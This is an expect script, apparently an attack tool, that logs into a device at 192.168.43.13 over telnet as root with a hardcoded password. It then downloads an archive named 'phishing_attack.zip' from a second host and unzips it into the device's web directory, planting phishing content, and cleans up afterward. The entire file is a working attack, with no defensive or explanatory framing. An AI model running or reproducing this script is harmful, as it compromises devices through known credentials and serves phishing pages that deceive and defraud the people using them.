#!/usr/bin/expect

set phishing_attack_zip "http://192.168.43.226:81/phishing_attack.zip"
spawn telnet 192.168.43.13
expect "login: "
send "root\n"
expect "Password: "
send "cat1029\n"

expect "# "
send "cd /bin/vs/web\r"
expect "# "

send "wget -O phishing_attack.zip $phishing_attack_zip\r"

expect "# "

send "unzip -o phishing_attack.zip\r"
expect "# "
send "rm phishing_attack.zip\r"


expect "# "
send "exit\r"

interact 

